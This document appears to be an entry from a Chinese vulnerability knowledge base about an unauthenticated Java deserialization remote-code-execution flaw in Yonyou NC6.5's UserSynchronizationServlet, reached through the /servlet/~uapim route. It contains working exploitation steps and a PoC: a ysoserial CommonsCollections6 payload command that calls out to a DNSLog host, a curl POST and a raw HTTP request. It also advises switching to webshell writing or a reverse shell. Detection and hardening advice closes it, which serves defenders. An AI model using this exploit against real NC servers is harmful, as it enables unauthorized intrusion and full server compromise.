---
id: web-java-deser-yonyou-nc-usersynchronizationservlet
title: 用友 NC UserSynchronizationServlet 未认证 readObject 入口：/servlet/~uapim 路由叠加 CC6 链 RCE
type: scenario
domain: web
path: web/java/deserialization
technique: java-native-deserialization-servlet-readobject-entry
aliases:
- 用友 NC 反序列化
- UserSynchronizationServlet 反序列化
- NCInvokerServlet /~ 路由
- /servlet/~uapim/nc.bs.pub.im.UserSynchronizationServlet
- 用友 NC6.5 RCE
tags:
- java
- deserialization
- yonyou
- nc
- servlet
- readobject
- commonscollections
- gadget-chain
- cve-less
cve: []
severity: critical
confidence: high
status: verified
affected_versions: 用友 NC6.5
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V57
  verified_at: '2026-11-05T08:55:25+08:00'
  notes: 已对照原文与5张图核对：图01 uapim\lib\pubuapim_impluginLevel-1.jar 定位、图02 doPost 先 new ObjectInputStream(request.getInputStream()).readObject() 后 serviceAuthCheck、图03 web.xml /service/* 与 /servlet/* 映射 NCInvokerServlet、图04 POST /servlet/~uapim/nc.bs.pub.im.UserSynchronizationServlet + {{file{c:\c.bin}}} 占位符、图05 DNSLog 记录均一致；CC6 链与 ysoserial 命令、路由格式与原文一致，属已打通 RCE。原文正文 dnslog 域名为 xxe.jagvy1.dnslog.cn，图05 记录为 egfd xg.dnslog.cn，不影响结论。受影响版本按原文明确写 用友 NC6.5 已设置。PoC未在本机执行；frontmatter无sources/source_url（全库惯例）。
---

## 一句话结论

用友 NC6.5 的 `nc.bs.pub.im.UserSynchronizationServlet.doPost` 在鉴权之前就用 `ObjectInputStream(request.getInputStream()).readObject()` 反序列化请求体，且可通过 `NCInvokerServlet` 的 `/servlet/~uapim/<类全名>` 路由直接访问；攻击者只需 POST 一个 CommonsCollections6 序列化 payload，即可在服务器上执行任意命令（原文以 DNSLog 回显证明）。

## 原理

- **入口未鉴权**：`doPost` 首先 `new ObjectInputStream(request.getInputStream())`，随后 `(HashMap) in.readObject()`；读取 `headInfo.get("ts")` 等字段并做 `RSAUtils.serviceAuthCheck` 是在反序列化之后，因此认证逻辑无法阻止 gadget 触发。`doGet` 又直接调用 `doPost`，GET/POST 都可利用。
- **路由可达**：`web.xml` 把 `/service/*` 与 `/servlet/*` 都映射到 `NCInvokerServlet`。其 `doAction()` 解析 `pathInfo`：以 `/~` 开头时，`~` 后第一段为 `moduleName`，其余为 `serviceName`，再 `getServiceObject(moduleName, serviceName)` 并按 `Servlet` 实例化调用。于是 `/servlet/~uapim/nc.bs.pub.im.UserSynchronizationServlet` 会加载 `uapim` 模块（原文定位到 `uapim\lib\pubuapim_impluginLevel-1.jar`）中的该类并执行 `service()`，不需要框架层认证。
- **链为何能执行**：`readObject()` 在返回对象前会完整还原对象图并触发各类 `readObject`/`hashCode`/`equals` 等回调；ysoserial 的 CommonsCollections6 链（`HashSet` → `TiedMapEntry` → `LazyMap` → `ChainedTransformer` → `InvokerTransformer` → `Runtime.exec`）在反序列化过程中执行命令。即使随后把结果强转 `HashMap` 抛 `ClassCastException`，命令已经执行，异常被 catch 后只记日志。
- **前提**：目标 classpath 存在 `commons-collections`（原文说明 NC 存在 CC 依赖），且 JDK/组件未启用有效的反序列化黑名单。

## 触发条件

- 用友 NC6.5，且 `UserSynchronizationServlet`（`uapim` 模块）可被 `NCInvokerServlet` 路由到；
- 8080/80 等 NC Web 端口对攻击者可达；
- 目标 classpath 含可利用的 gadget 依赖（原文使用 CommonsCollections6）；
- 无需任何账号或认证。

## 利用步骤

1. 确认目标为用友 NC，尝试访问 `/servlet/~uapim/nc.bs.pub.im.UserSynchronizationServlet`（或先在 Jar 中定位类：`findstr /msi /c:"UserSynchronizationServlet" *.jar`）。
2. 用 ysoserial 生成 CC6 payload：
   `java -jar ysoserial-all.jar CommonsCollections6 "ping <dnslog-domain>" > c.bin`
3. 将 `c.bin` 作为原始请求体 POST 到上述路由（不要做 URL 编码/JSON 包装）。
4. 在 DNSLog/回连平台确认收到解析或连接，证明命令执行；再把命令换成读取配置、写 WebShell 或反弹 Shell。

## PoC

```bash
java -jar ysoserial-all.jar CommonsCollections6 "ping xxe.jagvy1.dnslog.cn" > c.bin

curl -X POST 'http://<target>/servlet/~uapim/nc.bs.pub.im.UserSynchronizationServlet' \
  -H 'Content-Type: application/octet-stream' \
  --data-binary @c.bin
```

原文请求：

```http
POST /servlet/~uapim/nc.bs.pub.im.UserSynchronizationServlet HTTP/1.1
Host: <target>
Accept-Encoding: gzip
User-Agent: Mozilla/5.0 ...

<c.bin 原始二进制内容>
```

原文截图中的 `{{file{c:\c.bin}}}` 是测试工具的“从文件加载请求体”占位符，实际发送的是 `c.bin` 的二进制内容；DNSLog 记录证明 `ping` 被执行。

## 变体与关联

- 入口变体：NC 中其他继承 `HttpServlet` 且在 `service/doPost` 中 `readObject` 的类，同样可经 `/~<module>/<class>` 路由访问。
- 链变体：CommonsCollections1/3/5/7、CommonsBeanutils 等，取决于目标 classpath 与 JDK 版本；也可换用 JNDI 注入链。
- 关联：[[web-java-deser-commonscollections-cc6-cc3-templatesimpl]]（CC6 链本身）；[[web-java-deserialization-jndi-ufida-sprmonitorservlet]]（同为国产 ERP Servlet 反序列化入口）。
- 该卡价值在“入口/路由”而非新 gadget：NCInvokerServlet 把任意 `/~` 路径映射成 Servlet 调用，放大了内部 Servlet 的可达性。

## 检测与防御

- 检测：访问 `/servlet/~`、`/service/~` 的异常请求；POST 体以 Java 序列化魔数 `AC ED 00 05` 开头；请求体出现 `java.util.HashSet`、`TiedMapEntry`、`InvokerTransformer` 等 gadget 类名；服务器进程发起异常 DNS/HTTP 回连。
- 修复：升级/打补丁，移除或限制 `NCInvokerServlet` 的 `/~` 任意类路由；对 `ObjectInputStream` 设置 `ObjectInputFilter` 白名单，禁用 CommonsCollections 等危险 gadget 类；`UserSynchronizationServlet` 在反序列化前鉴权且改用安全协议（JSON/签名）。
- 加固：移除不必要的 commons-collections 依赖或升级到安全版本；WAF 拦截 `/servlet/~` 与序列化魔数；限制服务器出网并监控 DNS 日志。
